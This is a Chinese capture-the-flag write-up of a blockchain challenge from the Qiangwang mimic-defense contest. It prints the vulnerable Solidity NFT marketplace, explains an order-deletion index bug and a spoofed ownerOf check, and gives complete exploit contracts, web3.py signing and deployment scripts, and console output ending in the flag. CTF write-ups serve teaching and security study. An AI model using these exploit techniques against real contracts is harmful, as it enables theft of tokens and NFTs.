# 强网拟态区块链题Revenge NTF WP

> 原文: https://www.ctfiot.com/81173.html
> ID: 81173

第五届“强网”拟态防御国际精英挑战赛

一、源码

pragma solidity 0.8.16;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract CtfNFT is ERC721, Ownable {
    constructor() ERC721("CtfNFT", "NFT") {
        _setApprovalForAll(address(this), msg.sender, true);
    }

    function mint(address to, uint256 tokenId) external onlyOwner {
        _mint(to, tokenId);
    }
}

contract CtfToken is ERC20 {
    bool airdropped;

    constructor() ERC20("CtfToken", "CTK") {
        _mint(address(this), 100000000000);
        _mint(msg.sender, 1337);
    }

    function airdrop() external {
        require(!airdropped, "Already airdropped");
        airdropped = true;
        _mint(msg.sender, 5);
    }
}

struct Order {
    address nftAddress;
    uint256 tokenId;
    uint256 price;
}
struct Coupon {
    uint256 orderId;
    uint256 newprice;
    address issuer;
    address user;
    bytes reason;
}
struct Signature {
    uint8 v;
    bytes32[2] rs;
}
struct SignedCoupon {
    Coupon coupon;
    Signature signature;
}

contract CtfMarket {
    event SendFlag();
    event NFTListed(
        address indexed seller,
        address indexed nftAddress,
        uint256 indexed tokenId,
        uint256 price
    );

    event NFTCanceled(
        address indexed seller,
        address indexed nftAddress,
        uint256 indexed tokenId
    );

    event NFTBought(
        address indexed buyer,
        address indexed nftAddress,
        uint256 indexed tokenId,
        uint256 price
    );

    bool tested;
    CtfNFT public ctfNFT;
    CtfToken public ctfToken;
    CouponVerifierBeta public verifier;
    Order[] orders;

    constructor() {
        ctfToken = new CtfToken();
        ctfToken.approve(address(this), type(uint256).max);

        ctfNFT = new CtfNFT();
        ctfNFT.mint(address(ctfNFT), 1);
        ctfNFT.mint(address(this), 2);
        ctfNFT.mint(address(this), 3);

        verifier = new CouponVerifierBeta();

        orders.push(Order(address(ctfNFT), 1, 1));
        orders.push(Order(address(ctfNFT), 2, 1337));
        orders.push(Order(address(ctfNFT), 3, 13333333337));
    }

    function getOrder(uint256 orderId) public view returns (Order memory order) {
        require(orderId < orders.length, "Invalid orderId");
        order = orders[orderId];
    }

    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {
        require(price > 0, "Invalid price");
        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), "Not owner");
        orders.push(Order(nftAddress, tokenId, price));
        emit NFTListed(msg.sender, nftAddress, tokenId, price);
        return orders.length - 1;
    }

    function cancelOrder(uint256 orderId) external {
        Order memory order = getOrder(orderId);
        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), "Not owner");
        _deleteOrder(orderId);
        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);
    }

    function purchaseOrder(uint256 orderId) external {
        Order memory order = getOrder(orderId);
        _deleteOrder(orderId);
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        ctfToken.transferFrom(msg.sender, owner, order.price);
        nft.safeTransferFrom(owner, msg.sender, order.tokenId);
        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);
    }

    function purchaseWithCoupon(SignedCoupon calldata scoupon) external {
        Coupon memory coupon = scoupon.coupon;
        require(coupon.user == msg.sender, "Invalid user");
        require(coupon.newprice > 0, "Invalid price");
        verifier.verifyCoupon(scoupon);
        Order memory order = getOrder(coupon.orderId);//(address=fakeNFT, id=3, price=1) orderID = 0
        uint price = order.price; // price=1
        _deleteOrder(coupon.orderId); // del 0
        IERC721 nft = IERC721(order.nftAddress); // fakeNFT address
        address owner = nft.ownerOf(order.tokenId);// fakeNFT fake ownerOf market
        ctfToken.transferFrom(coupon.user, owner, price);// msg.sender market 1
        IERC721(getOrder(coupon.orderId).nftAddress).safeTransferFrom(owner, coupon.user, order.tokenId);
        _deleteOrder(coupon.orderId);
        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);
    }

    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {
        require(!tested, "Tested");
        tested = true;
        IERC721 nft = IERC721(nftAddress);
        uint256 orderId = CtfMarket(this).createOrder(nftAddress, tokenId, price);
        nft.approve(address(this), tokenId);
        CtfMarket(this).purchaseOrder(orderId);
    }

    function win() external {
        require(ctfNFT.ownerOf(1) == msg.sender && ctfNFT.ownerOf(2) == msg.sender && ctfNFT.ownerOf(3) == msg.sender);
        emit SendFlag();
    }

    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {
        IERC721 nft = IERC721(nftAddress);
        address owner = nft.ownerOf(tokenId);
        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);
    }

    function _deleteOrder(uint256 orderId) internal {
        orders[orderId] = orders[orders.length - 1];
        orders.pop();
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract CouponVerifierBeta {
    CtfMarket market;
    bool tested;

    constructor() {
        market = CtfMarket(msg.sender);
    }

    function verifyCoupon(SignedCoupon calldata scoupon) public {
        require(!tested, "Tested");
        tested = true;
        Coupon memory coupon = scoupon.coupon;
        Signature memory sig = scoupon.signature;
        Order memory order = market.getOrder(coupon.orderId);
        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        require(coupon.issuer == owner, "Invalid issuer");
        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");
    }
}

二、分析

首先查看获取flag的条件：

调用者需要获取这3个nft。

这3个nft在market合约中被mint:

1号mint给了NFT合约，价格为1wei，2号和3号mint给market合约。orders为一个订单列表，里面增加了3个订单，分别给3个NFT定价1，1337，13333333337wei，支付使用的ERC20token为CtfToken：

CtfToken给market合约mint了1337wei，并且里面还可以领取一次空投，数量为5wei。

查看market合约，找到了一个可疑的函数purchaseTest：

这个函数可以强制让market合约购买我们自己创建的订单，但是只能调用一次。

我们可以先花1wei购买1号nft，再用这个nft再order中挂一个价格为1wei的订单，调用purchaseTest用1号nft创建一个价格为1337的订单，并让market购买这个订单。这时这个原价为1wei的nft就被我们以1337的价格强卖给了market合约。这时再花1wei去买之前我们自己创建的1号nft价格为1wei的订单，现在1号nft又回到我们手里，并且自己的余额有1341，足够再把2号nft买回来，现在我们就拥有了1、2号nft。

获取3号nft需要purchaseWithCoupon函数中的漏洞：

首先先传入一个SignedCoupon结构体：

接着调用了verifier.verifyCoupon(scoupon)检查了这个结构体中的字段，我们暂时先不管，先当作绕过了这个检查。

之后，从Coupon结构体中获取了orderId，并通过orderId从订单列表中获取到了相应的订单，从这个订单中获取到了价格，nft合约，并通过tokenId和nft合约地址获取到了nft的所有者，然后删除了这个订单。

接着购买者向nft所有者发送之前获取到的价格的ERC20token。

接下来应该合约所有者向购买者发送合约了：

仔细观察这条语句应该就能发现问题：

这里nft合约的地址是用getOrder从order列表中取出来的，但是在上文已经用_deleteOrder将相应的订单删除了，那么现在这个订单究竟是什么呢？

看一下删除订单的逻辑：

这里的逻辑是将相应id的order与末尾的order进行交换，再将末尾的order pop出去。

回到purchaseWithCoupon函数，在相应id的order被删除之后，再通过getOrder获取订单就会得到原订单之后的订单，比如现在列表中有4个订单 1 2 3 4 ，删除id为2的订单，这时列表为1 2 4，这时用id2访问，就会得到4号nft的订单。

由于在删除前，获取到的包括nft地址、nft id、价格都是正确位置的订单中的，而后面转移nft用的nft地址用的是后一个order。

所以我们可以想办法在3号nft订单的前面插一个假订单，并将价格设置为1wei。这样转erc20token的时候用的是假订单中的价格，在删除假订单后，这个orderId就指向了后一个，即真的订单，这样我们就可以1wei的价格购买到3号nft。

为了创建假订单，需要调用createOrder函数:

这个函数中会判断调用者是否是这个token的所有者或被授权者，所以我们创建一个假的NFT合约，写一个isApprovedForAll函数，让它直接返回true。

但如何把这个假订单放在3号nft订单的后面呢？

在初始状态，列表中的3个订单为：

1 2 3

这时我们床架假订单：

1 2 3 F

这时购买1号NFT：

2 3 F

再挂1号NFT价格1wei的订单：

2 3 F 1

调用purchaseTest创建1号NFT价格为1337的订单：

2 3 F 1 1

market购买4号订单，我们再购买3号订单：

2 3 F

这时购买2号nft：

F 3

这时假的订单就成功的放到了3号nft订单的前面。

但purchaseWithCoupon中的verifier.verifyCoupon(scoupon)还没有解决：

这里用传入nft合约的ownerOf函数取得nft的所有者，要求折扣提供者为nft的所有者，并且需要该所有者的数字签名。但是我们已经知道这里传进去的假订单，nft的所有者是我们自己的地址，签名直接用自己的私钥签即可。但是在purchaseWithCoupon中也有用ownerOf获取nft的所有者，但在哪里我们需要返回的是真的nft的所有者，即market合约，所以需要在verifyCoupon函数中，这个ownerOf要返回我们的地址，而在purchaseWithCoupon中要返回market的地址，所以我们需要重写假nft合约的ownerOf函数。而在verifyCoupon函数中ownerOf函数是第一次调用purchaseWithCoupon函数是第二次调用，似乎我们可以声明一个标志位，通过这个标志位来判断返回相应的地址：

但是查看ownerOf的函数原型，发现该函数是view的：

而我们重写的是有状态变化的，所以要另想办法。

可以发现在verifyCoupon函数中，调用者是CouponVerifierBeta合约，而在purchaseWithCoupon中，调用者是market合约，那我们就可以通过调用者的不同来返回相应的地址，这时候函数就是view的，不会发生回退：

而签名部分，我们写一个函数，返回要签名部分的哈希值：

签名可以使用web3.py的库：

三、攻击过程

首先获取market合约的地址：

通过market合约获取CtfMarket合约地址：0xff109547782BdDe334d5B2397936A3A14f3F9e3b

CtfToken合约地址：0x731a35e5E037a8093eddc4CBAE114A8d44a210fc

编写假的nft合约：

编写攻击合约:

使用remix编译合约，获取字节码与abi，并使用web3.py进行部署：

前两个nft的获取都写在构造函数里，合约部署完成之后1、2号nft应该已经获取，这时调用exp合约的getSerialized函数，并使用web3.py进行签名：

将获取到的vrs作为参数，调用exp合约的buy3，就获取到了3号nft，最后调用flag函数，即可出发相应的事件：

最后根据触发事件的tx获取flag：


```
pragma solidity 0.8.16;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract CtfNFT is ERC721, Ownable {
    constructor() ERC721("CtfNFT", "NFT") {
        _setApprovalForAll(address(this), msg.sender, true);
    }

    function mint(address to, uint256 tokenId) external onlyOwner {
        _mint(to, tokenId);
    }
}

contract CtfToken is ERC20 {
    bool airdropped;

    constructor() ERC20("CtfToken", "CTK") {
        _mint(address(this), 100000000000);
        _mint(msg.sender, 1337);
    }

    function airdrop() external {
        require(!airdropped, "Already airdropped");
        airdropped = true;
        _mint(msg.sender, 5);
    }
}

struct Order {
    address nftAddress;
    uint256 tokenId;
    uint256 price;
}
struct Coupon {
    uint256 orderId;
    uint256 newprice;
    address issuer;
    address user;
    bytes reason;
}
struct Signature {
    uint8 v;
    bytes32[2] rs;
}
struct SignedCoupon {
    Coupon coupon;
    Signature signature;
}

contract CtfMarket {
    event SendFlag();
    event NFTListed(
        address indexed seller,
        address indexed nftAddress,
        uint256 indexed tokenId,
        uint256 price
    );

    event NFTCanceled(
        address indexed seller,
        address indexed nftAddress,
        uint256 indexed tokenId
    );

    event NFTBought(
        address indexed buyer,
        address indexed nftAddress,
        uint256 indexed tokenId,
        uint256 price
    );

    bool tested;
    CtfNFT public ctfNFT;
    CtfToken public ctfToken;
    CouponVerifierBeta public verifier;
    Order[] orders;

    constructor() {
        ctfToken = new CtfToken();
        ctfToken.approve(address(this), type(uint256).max);

        ctfNFT = new CtfNFT();
        ctfNFT.mint(address(ctfNFT), 1);
        ctfNFT.mint(address(this), 2);
        ctfNFT.mint(address(this), 3);

        verifier = new CouponVerifierBeta();

        orders.push(Order(address(ctfNFT), 1, 1));
        orders.push(Order(address(ctfNFT), 2, 1337));
        orders.push(Order(address(ctfNFT), 3, 13333333337));
    }

    function getOrder(uint256 orderId) public view returns (Order memory order) {
        require(orderId < orders.length, "Invalid orderId");
        order = orders[orderId];
    }

    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {
        require(price > 0, "Invalid price");
        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), "Not owner");
        orders.push(Order(nftAddress, tokenId, price));
        emit NFTListed(msg.sender, nftAddress, tokenId, price);
        return orders.length - 1;
    }

    function cancelOrder(uint256 orderId) external {
        Order memory order = getOrder(orderId);
        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), "Not owner");
        _deleteOrder(orderId);
        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);
    }

    function purchaseOrder(uint256 orderId) external {
        Order memory order = getOrder(orderId);
        _deleteOrder(orderId);
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        ctfToken.transferFrom(msg.sender, owner, order.price);
        nft.safeTransferFrom(owner, msg.sender, order.tokenId);
        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);
    }

    function purchaseWithCoupon(SignedCoupon calldata scoupon) external {
        Coupon memory coupon = scoupon.coupon;
        require(coupon.user == msg.sender, "Invalid user");
        require(coupon.newprice > 0, "Invalid price");
        verifier.verifyCoupon(scoupon);
        Order memory order = getOrder(coupon.orderId);//(address=fakeNFT, id=3, price=1) orderID = 0
        uint price = order.price; // price=1
        _deleteOrder(coupon.orderId); // del 0
        IERC721 nft = IERC721(order.nftAddress); // fakeNFT address
        address owner = nft.ownerOf(order.tokenId);// fakeNFT fake ownerOf market
        ctfToken.transferFrom(coupon.user, owner, price);// msg.sender market 1
        IERC721(getOrder(coupon.orderId).nftAddress).safeTransferFrom(owner, coupon.user, order.tokenId);
        _deleteOrder(coupon.orderId);
        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);
    }

    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {
        require(!tested, "Tested");
        tested = true;
        IERC721 nft = IERC721(nftAddress);
        uint256 orderId = CtfMarket(this).createOrder(nftAddress, tokenId, price);
        nft.approve(address(this), tokenId);
        CtfMarket(this).purchaseOrder(orderId);
    }

    function win() external {
        require(ctfNFT.ownerOf(1) == msg.sender && ctfNFT.ownerOf(2) == msg.sender && ctfNFT.ownerOf(3) == msg.sender);
        emit SendFlag();
    }

    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {
        IERC721 nft = IERC721(nftAddress);
        address owner = nft.ownerOf(tokenId);
        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);
    }

    function _deleteOrder(uint256 orderId) internal {
        orders[orderId] = orders[orders.length - 1];
        orders.pop();
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract CouponVerifierBeta {
    CtfMarket market;
    bool tested;

    constructor() {
        market = CtfMarket(msg.sender);
    }

    function verifyCoupon(SignedCoupon calldata scoupon) public {
        require(!tested, "Tested");
        tested = true;
        Coupon memory coupon = scoupon.coupon;
        Signature memory sig = scoupon.signature;
        Order memory order = market.getOrder(coupon.orderId);
        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        require(coupon.issuer == owner, "Invalid issuer");
        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");
    }
}
function win() external {
        require(ctfNFT.ownerOf(1) == msg.sender && ctfNFT.ownerOf(2) == msg.sender && ctfNFT.ownerOf(3) == msg.sender);
        emit SendFlag();
    }
constructor() {
        ctfToken = new CtfToken();
        ctfToken.approve(address(this), type(uint256).max);

        ctfNFT = new CtfNFT();
        ctfNFT.mint(address(ctfNFT), 1);
        ctfNFT.mint(address(this), 2);
        ctfNFT.mint(address(this), 3);

        verifier = new CouponVerifierBeta();

        orders.push(Order(address(ctfNFT), 1, 1));
        orders.push(Order(address(ctfNFT), 2, 1337));
        orders.push(Order(address(ctfNFT), 3, 13333333337));
    }
contract CtfToken is ERC20 {
    bool airdropped;

    constructor() ERC20("CtfToken", "CTK") {
        _mint(address(this), 100000000000);
        _mint(msg.sender, 1337);
    }

    function airdrop() external {
        require(!airdropped, "Already airdropped");
        airdropped = true;
        _mint(msg.sender, 5);
    }
}
function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {
        require(!tested, "Tested");
        tested = true;
        IERC721 nft = IERC721(nftAddress);
        uint256 orderId = CtfMarket(this).createOrder(nftAddress, tokenId, price);
        nft.approve(address(this), tokenId);
        CtfMarket(this).purchaseOrder(orderId);
    }
function purchaseWithCoupon(SignedCoupon calldata scoupon) external {
        Coupon memory coupon = scoupon.coupon;
        require(coupon.user == msg.sender, "Invalid user");
        require(coupon.newprice > 0, "Invalid price");
        verifier.verifyCoupon(scoupon);
        Order memory order = getOrder(coupon.orderId);
        uint price = order.price;
        _deleteOrder(coupon.orderId);
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        ctfToken.transferFrom(coupon.user, owner, price);
        IERC721(getOrder(coupon.orderId).nftAddress).safeTransferFrom(owner, coupon.user, order.tokenId);
        _deleteOrder(coupon.orderId);
        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);
    }
struct Coupon {
    uint256 orderId;
    uint256 newprice;
    address issuer;
    address user;
    bytes reason;
}
struct Signature {
    uint8 v;
    bytes32[2] rs;
}
struct SignedCoupon {
    Coupon coupon;
    Signature signature;
}
IERC721(getOrder(coupon.orderId).nftAddress).safeTransferFrom(owner, coupon.user, order.tokenId);
function _deleteOrder(uint256 orderId) internal {
        orders[orderId] = orders[orders.length - 1];
        orders.pop();
    }
function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {
        require(price > 0, "Invalid price");
        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), "Not owner");
        orders.push(Order(nftAddress, tokenId, price));
        emit NFTListed(msg.sender, nftAddress, tokenId, price);
        return orders.length - 1;
    }
    
function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {
        IERC721 nft = IERC721(nftAddress);
        address owner = nft.ownerOf(tokenId);
        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);
    }
function verifyCoupon(SignedCoupon calldata scoupon) public {
        require(!tested, "Tested");
        tested = true;
        Coupon memory coupon = scoupon.coupon;
        Signature memory sig = scoupon.signature;
        Order memory order = market.getOrder(coupon.orderId);
        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );
        IERC721 nft = IERC721(order.nftAddress);
        address owner = nft.ownerOf(order.tokenId);
        require(coupon.issuer == owner, "Invalid issuer");
        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, "Invalid signature");
    }
bool public flag = false;

function ownerOf(uint256 tokenId) public virtual returns(address) {
        if (!flag) {
          flag = true;
          return fake_issurerl;
        } else {
          return market;
        }
    }
function ownerOf(uint256 tokenId) external view returns (address owner);
function ownerOf(uint256 tokenId) public virtual returns(address) {
        if (msg.sender==address(market)) {
            return market;
        } else {
            return fake_issuer;
        }
    }
function getSerialized() public view returns (bytes32) {
        Coupon memory coupon = Coupon(
                0, // orderId
                1, // newprice
                issuer, // issuer
                address(this), // user
                bytes("exp")
        );
        Order memory order = market.getOrder(coupon.orderId);
        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );
        return keccak256(serialized);
    }
from web3.auto import w3
from web3 import Web3
from eth_account.messages import encode_defunct, _hash_eip191_message

def to_32byte_hex(val):
    return Web3.toHex(Web3.toBytes(val).rjust(32, b' '))

private_key = '0x6f985a8ef2c5b6e77'
_hash = "0x7c9830d7479756cbc3c70f0441c4ba902d66f4587f27edce9ef0e260aa61897b"

sign = w3.eth.account.signHash(_hash, private_key=private_key)

print("h: {}", Web3.toHex(sign.messageHash))
print("v: {}", sign.v)
print("r; {}", to_32byte_hex(sign.r))
print("s: {}", to_32byte_hex(sign.s))

ad = w3.eth.account.recoverHash(_hash, signature=sign.signature)
print(ad)
[+] Welcome!
[+] sha256(g5VvvAbh+?).binary.endswith('000000000000000000')
[-] ?=554540
[+] passed

We design a pretty easy contract game. Enjoy it!

1. Create a game account
2. Deploy a game contract
3. Request for flag
4. Get source code

ps: Option 1, get an account which will be used to deploy the contract;

ps: Option 2, the robot will use the account to deploy the contract for the problem;

ps: Option 3, use this option to obtain the flag when emit SendFlag event in the contract;

ps: Option 4, use this option to get source code.

You can finish this challenge in a lot of connections.

^_^ geth attach http://ip:
8545

^_^ Get Testnet Ether from http://ip:
8080

[-] input your choice: 2
[-] input your token: am6ZpsjrTJzmQMDHWxUQhxSv4C5mzeSi0EczjjLZ+DSlFwaVtmFqj2ALy2QqxqMn/ehMFY0vls/XpZ2OMQj1GkVMwZI+B83T1d30X5IV2eS96FXqi9RIFvd+yC5Wx9hN9Xbsej4ogGqztg0hH8A4EE8OxakX3Mc9gsCljsCdlS4=
[+] new token: 97zQeRnF6GYJy/ETfLMzJu6FeFag2BiP67zGUs8p+PAkGO6t7QrV+7SHAC19gM8ZT+dh9wpRiQfbXAg2rxQNKcAmNATrP+VmUP+DVaoKzzWTiYwkBQeaU6JSprqJyiKOm9BehGckozgDb+hh8YGTxFr8jpxG3pZBRNDuh35uX1HxXTSoNMUhy9AODO82S+099s+cK2BR55kNVQa4turEnw==
[+] Your goal is to emit SendFlag event
[+] Transaction hash: 0x486eb65e5e0c273d3302f0c659e8ad5c75bb85752853fb92659e247fd92c7c76
[+] CtfMarket contract address : 0x99a4d18Ed41d62B76f97421880Ac393363b33DC0
contract FakeNFT is Context, ERC165 {
    
    address public fake_issuer;
    address public market;
    bool public open;
    mapping(uint256 => address) public _owners;

    function set_fake_issuer(address _fake_issuer) public {
        fake_issuer = _fake_issuer;
    }

    function set_market_owner(address _market) public {
        market = _market;
    }

    function mint(address _owner, uint256 _tokenId) public {
        _owners[_tokenId] = _owner;
    }

    function ownerOf(uint256 tokenId) public virtual returns(address) {
        if (msg.sender==address(market)) {
            return market;
        } else {
            return fake_issuer;
        }
    }

    function isApprovedForAll(address _owner, address _spender) public pure returns(bool) {
        return true;
    }

    function getApproved(address _tokenId) public view returns (address) {
        return address(this);
    }
}
contract exp {
    CtfMarket public market = CtfMarket(0x99a4d18Ed41d62B76f97421880Ac393363b33DC0);
    CtfNFT public nft = CtfNFT(0xff109547782BdDe334d5B2397936A3A14f3F9e3b);
    CtfToken public token = CtfToken(0x731a35e5E037a8093eddc4CBAE114A8d44a210fc);
    FakeNFT public fakeNFT;
    address issuer = 0x206282f74534CE358Db1125793A074Bf5da06943;

    constructor() {
        fakeNFT = new FakeNFT();
        fakeNFT.set_fake_issuer(issuer);
        fakeNFT.set_market_owner(address(market));
        mintFakeNFT();
        createFakeOrder();
        airDrop();
        buy1();
        lie();
    }

    function mintFakeNFT() public {
      // mint假的nft给本合约
        fakeNFT.mint(address(this), 3); // 123 [4]
    }

    function createFakeOrder() public {
      // 创建假的订单
        market.createOrder(address(fakeNFT), 3, 1);// 123 [4]
    }

    function airDrop() public {
      // 领取空投
        token.airdrop();
    }

    function buy1() public {
      // 授权给market足够的token
        token.approve(address(market), 100000000);
        // 授权给market所有的nft
        nft.setApprovalForAll(address(market), true); 
        // 购买1号nft
        market.purchaseOrder(0);                        // 423
        // 创建1号nft价格为1wei的订单
        market.createOrder(address(nft), 1, 1);         // 4231
    }
  
  // 强卖1号nft给market合约
    function lie() public {
      // 创建1337wei的订单，market购买该订单
        market.purchaseTest(address(nft), 1, 1337);     // 42311 //4231
        // 买回1号nft
        market.purchaseOrder(3);                        // 423
        // 买2号nft
        market.purchaseOrder(1);                        // 43
    }
  
  // 买3号nft
    function buy3(uint8 v, bytes32[2] calldata rs) public {
        market.purchaseWithCoupon(SignedCoupon(
            Coupon(
                0, // orderId，0号订单，指向假订单
                1, // newprice，该价格是之后我们合约向nft所有者转账的金额
                issuer, // issuer，折扣提供者，这里应为我们签名的地址
                address(this), // user
                bytes("exp")
            ),
            Signature(
                v, rs
            )
        ));
    }

    function flag() public {
        market.win();
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function getSerialized() public view returns (bytes32) {
        Coupon memory coupon = Coupon(
                0, // orderId
                1, // newprice
                issuer, // issuer
                address(this), // user
                bytes("exp")
        );
        Order memory order = market.getOrder(coupon.orderId);
        bytes memory serialized = abi.encode(
            "I, the issuer", coupon.issuer,
            "offer a special discount for", coupon.user,
            "to buy", order, "at", coupon.newprice,
            "because", coupon.reason
        );
        return keccak256(serialized);
    }
}
with open('bytecode.txt', 'r') as f:
    code = f.read()

bytecode = code

contract = w3.eth.contract(abi=abi, bytecode=bytecode)

construct_txn = contract.constructor().buildTransaction({
    'from': account.address,
    'nonce': w3.eth.getTransactionCount(account.address),
    'gas': 5000000,
    'gasPrice': w3.toWei('21', 'gwei')
    }
)

signed = account.signTransaction(construct_txn)

tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_id)
address = receipt.contractAddress
print(address)
% python dev.py
0xc7C6f3893fF863bc070630C86bBeb26Cf0a07e0d
% python sign.py
h: {} 0x7c9830d7479756cbc3c70f0441c4ba902d66f4587f27edce9ef0e260aa61897b
v: {} 27
r; {} 0x3c0690f0dbb4ef2ec42d482c58d411c04090560b292d518d660f783e2a9e0f2d
s: {} 0x5e79e613d1653406d9d036d64ceee4971b84941adda64e85e5a964b7d22e538b
0x206282f74534CE358Db1125793A074Bf5da06943
python rpc.py
True
0x206282f74534CE358Db1125793A074Bf5da06943
AttributeDict({'blockHash': HexBytes('0xff53d1c989e5cad76e3b9bea0af493f9e35c186346bc6be2943591c0905179e5'), 'blockNumber': 104831, 'contractAddress': None, 'cumulativeGasUsed': 36902, 'effectiveGasPrice': 1000000000, 'from': '0x206282f74534CE358Db1125793A074Bf5da06943', 'gasUsed': 36902, 'logs': [AttributeDict({'address': '0x99a4d18Ed41d62B76f97421880Ac393363b33DC0', 'topics': [HexBytes('0x23ddb4dbb8577d03ebf1139a17a5c016963c43761e8ccd21eaa68e9b8ce6a68e')], 'data': '0x', 'blockNumber': 104831, 'transactionHash': HexBytes('0x56fdb6bf7a8bacec6e316d50a1b02137b8049a0490069fed52a76736588ca253'), 'transactionIndex': 0, 'blockHash': HexBytes('0xff53d1c989e5cad76e3b9bea0af493f9e35c186346bc6be2943591c0905179e5'), 'logIndex': 0, 'removed': False})], 'logsBloom': HexBytes('0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000800000010000000000000000000002000000000000'), 'status': 1, 'to': '0xc7C6f3893fF863bc070630C86bBeb26Cf0a07e0d', 'transactionHash': HexBytes('0x56fdb6bf7a8bacec6e316d50a1b02137b8049a0490069fed52a76736588ca253'), 'transactionIndex': 0, 'type': '0x0'})
[+] Welcome!
[+] sha256(iDjT6WLv+?).binary.endswith('000000000000000000')
[-] ?=173952
[+] passed

We design a pretty easy contract game. Enjoy it!

1. Create a game account
2. Deploy a game contract
3. Request for flag
4. Get source code

ps: Option 1, get an account which will be used to deploy the contract;

ps: Option 2, the robot will use the account to deploy the contract for the problem;

ps: Option 3, use this option to obtain the flag when emit SendFlag event in the contract;

ps: Option 4, use this option to get source code.

You can finish this challenge in a lot of connections.

^_^ geth attach http://ip:
8545

^_^ Get Testnet Ether from http://ip:
8080

[-] input your choice: 3
[-]input your new token: 97zQeRnF6GYJy/ETfLMzJu6FeFag2BiP67zGUs8p+PAkGO6t7QrV+7SHAC19gM8ZT+dh9wpRiQfbXAg2rxQNKcAmNATrP+VmUP+DVaoKzzWTiYwkBQeaU6JSprqJyiKOm9BehGckozgDb+hh8YGTxFr8jpxG3pZBRNDuh35uX1HxXTSoNMUhy9AODO82S+099s+cK2BR55kNVQa4turEnw==
[-] input tx_hash that emitted SendFlag event: 0x56fdb6bf7a8bacec6e316d50a1b02137b8049a0490069fed52a76736588ca253
[+] flag:
flag{dbf227cc-3cbe-4237-b68b-2269e00a3ed0}
```
